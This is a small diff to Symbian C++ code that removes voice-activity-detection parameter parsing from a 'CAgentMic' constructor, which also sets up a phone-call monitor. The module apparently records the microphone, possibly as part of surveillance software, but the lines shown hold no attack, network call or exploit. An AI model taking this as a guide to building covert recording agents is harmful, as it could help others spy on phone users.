@@ -89,14 +89,6 @@ void CAgentMic::ConstructL(const TDesC8& params)
 		
 	BaseConstructL(params);
 	
-	TUint8* ptr = (TUint8 *)iParams.Ptr();
-	TUint32 vad=0;               
-	Mem::Copy( &vad, ptr, 4);
-	if(vad == 1)
-		iVadActive = ETrue;
-	ptr += 4;
-	Mem::Copy(&iVadThreshold,ptr,4 );
-	
 	iCallMonitor = CSlimPhoneCallMonitor::NewL(*this);
 	iTimer = CTimeOutTimer::NewL(*this);
 		
